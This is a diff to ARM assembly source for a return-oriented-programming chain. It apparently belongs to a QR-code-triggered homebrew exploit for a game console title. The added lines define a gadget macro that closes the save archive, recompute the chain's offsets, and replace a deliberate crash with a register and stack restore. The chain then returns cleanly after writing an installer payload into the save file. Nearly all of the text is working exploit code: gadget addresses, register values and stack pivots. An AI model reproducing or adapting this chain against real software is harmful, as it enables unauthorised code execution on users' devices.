@@ -274,12 +274,31 @@ CN_INSTALLERDATA_SIZE equ (installerdata_end - installerdata)
 		.word 0xDEADC0DE ; r11 (garbage)
 .endmacro
 
+.macro fsuCloseArchive,fsuHandle,archive_handle_ptr
+	mov_u64 CN_SECONDARYROP_DST + @@archive_param, archive_handle_ptr
+	set_lr ROP_CN_POP_PC
+	.word ROP_CN_POP_R0PC ; pop {r0, pc}
+		.word fsuHandle ; R0 : fsu handle
+	.word ROP_CN_POP_R1PC ; pop {r1, pc}
+		.word 0xDEADC0DE ; R1 : garbage
+	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
+		@@archive_param:
+		.word 0xDEADC0DE ; R2
+		.word 0xDEADC0DE ; R3
+		.word 0xDEADC0DE ; r4 (garbage)
+	.word CN_FSCLOSEARCHIVE
+.endmacro
+
 ;length
 .orga 0x60
-	.word endROP-ROP+0xA8-0x64
+	.word 0xA8-0x64
+
+;length
+.orga 0xAA
+	.word endROP - (0xAA + 0x4)
 
 ;ROP
-.orga 0xA8
+.orga 0xF2
 ROP:
 	;jump to safer place
 		
@@ -311,9 +330,10 @@ ROP:
 
 		; jump to new rop buffer
 		.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
-			.word CN_SECONDARYROP_DST - (CN_STACKPAYLOADADR - 0xA8)
+			.word CN_SECONDARYROP_DST - (CN_STACKPAYLOADADR - ROP) + (secondaryROP - endROP)
 endROP:
 
+.align 0x4
 secondaryROP:
 
 	fsuOpenArchive CN_FSHANDLE_ADR, CN_SAVEARCHIVE_HANDLE, 0x00000004, 1, 0, 0
@@ -321,9 +341,28 @@ secondaryROP:
 	fsuWriteFile CN_SAVEFILE_HANDLE, CN_DUMMYPTR, CN_QRINSTALLER_OFFSET, 0, CN_INSTALLERDATA_PTR, CN_INSTALLERDATA_SIZE
 	fsuCloseFile CN_SAVEFILE_HANDLE
 	fsuControlArchive CN_FSHANDLE_ADR, CN_SAVEARCHIVE_HANDLE, 0, 0, 0, 0, 0
-	; sleep 0xFFFFFFFF, 0x0FFFFFFF
-	; todo : exit to home menu rather than crash ?
-	.word 0xdeaddead
+	fsuCloseArchive CN_FSHANDLE_ADR, CN_SAVEARCHIVE_HANDLE
+
+	; return address
+	str_val CN_STACKRESTORE_SP, CN_STACKRESTORE_RETADDR
+	; restore registers
+	; none of r4-r8 should actually matter (should be re-popped anyway) except for R7
+	; r9 - r10 are different per-region, but otherwise static
+	.word ROP_CN_POP_R4R5R6R7R8R9R10R11PC
+		.word 0x0FFFFF30 ; r4
+		.word 0x08E39A40 ; r5
+		.word 0x00000166 ; r6
+		.word 0x00000001 ; r7
+		.word 0x0FFFFEAC ; r8
+		.word CN_STACKRESTORE_R9 ; r9
+		.word CN_STACKRESTORE_R10 ; r10
+		.word 0x00000000 ; r11
+	.word ROP_CN_POP_R0PC
+		.word 0x0 ; 0 = failure
+	; jump sp back where it belongs
+	.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
+		.word 0x0FFFFA64 - (CN_SECONDARYROP_DST + last_sp)
+	last_sp:
 
 savefile_path:
 	.ascii CN_QRINSTALLER_PATH
